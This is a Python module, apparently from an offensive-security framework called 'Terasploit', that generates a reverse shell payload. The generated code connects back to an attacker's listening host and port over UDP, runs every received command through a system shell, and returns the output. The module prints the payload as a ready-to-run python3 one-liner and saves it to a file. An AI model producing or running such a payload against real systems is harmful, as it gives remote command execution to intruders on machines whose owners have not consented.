#######
# Module/Payload: Reverse UDP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitPayload(Payload):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {
                'License'        : 'Terasploit Framework License (BSD)',
                'Name'           : 'Shell Reverse Python UDP',
                'PayloadHandler' : PayloadHandler.REVERSE_TCP,
                'Module'         : Module.payload,
                'Arch'           : Arch.PYTHON,
                'Platform'       : Platform.UNIX,
                'Author'         : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description'    : [
                    'Generates an interactive reverse shell via python'
                ],
                
            }
        )
        
        if info_only:
            return

        register_option ("payload",opt=[
            OptIP.create("lhost",["","yes","the listening address"]),
            OptPort.create("lport",[4444,"yes","the listening port"])
        ])


    def run(self) -> None: 
        print_info (f'Generating shell...')
        self.generate_file("shell",Extension.PYTHON,self.generate())
        print ('----' + '\n' + f'python3 -c "{self.generate()}"' + '\n' + '----')
    
    
    def generate(self):
        lhost, lport = self.OPT()
        raw_shell: str = (
            "import socket, subprocess, os" + '\n' +
           f"host = '{lhost}'" + '\n' +
           f"port = '{lport}'" + '\n' +
            "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)" + '\n' +
            "s.connect((host,port))" + '\n' +
            "while True:" + '\n' +
            "   d = s.recv(1024)" + '\n' +
            "   if len(d) == 0:" + '\n' +
            "       break" + '\n' +
            "   p = subprocess.Popen(d.decode('utf-8'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)" + '\n' +
            "   o=p.stdout.read()+p.stderr.read()" + '\n' +
            "   s.send(o)"
        )
        
        return raw_shell